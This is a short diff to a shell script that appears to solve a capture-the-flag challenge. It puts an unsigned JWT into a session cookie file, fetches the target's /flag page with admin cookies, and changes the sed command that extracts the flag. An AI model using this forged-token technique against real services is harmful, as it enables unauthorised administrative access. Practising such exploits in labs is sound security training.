@@ -55,4 +55,4 @@ awk -v new_jwt="$UNSIGNED_TOKEN" 'BEGIN {OFS="\t"} {if ($6 == "jwt-session") $7 
 # Gather secret data
 echo "2.4 - GATHER ADMIN DATA"
 curl -s -X GET "http://$target_ip:8089/flag" -L -b /work/8-cookies-admin.txt -o /work/8-admin.html
-echo "--> Flag is : $(sed -n 's/.*to\(.*\)<\/p>.*/\1/p' /work/8-admin.html)"
+echo "--> Flag is : $(sed -n ':a;N;$!ba;s/.*<p[^>]*>\(.*\)<\/p>.*/\1/p' /work/8-admin.html)"
